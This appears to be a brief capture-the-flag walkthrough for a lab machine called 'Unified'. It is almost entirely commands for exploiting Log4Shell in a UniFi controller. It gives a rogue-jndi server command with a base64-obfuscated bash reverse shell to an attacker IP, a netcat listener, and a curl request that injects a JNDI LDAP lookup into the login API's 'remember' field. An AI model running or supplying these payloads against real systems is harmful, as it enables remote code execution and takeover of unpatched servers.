# Unified

Reference: [https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi](https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi)

1. Start rogue-jdni LDAP server:&#x20;

```
java -jar rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuMTI2LzIwMjIgMD4mMQo=}|{base64,-d}|{bash,-i}" --hostname "10.10.15.126"
```

2\. Start Netcat server `nc -nlvp 2022`

3\. Send the curl command:&#x20;

```
curl -i -s -k -X POST -H $'Host: 10.129.30.84:8443' -H $'Content-Length: 100' --data-binary $'{\"username\":\"a\",\"password\":\"a\",\"remember\":\"${jndi:ldap://10.10.15.126:1389/o=tomcat}\",\"strict\":true}' $'https://10.129.30.84:8443/api/login'
```

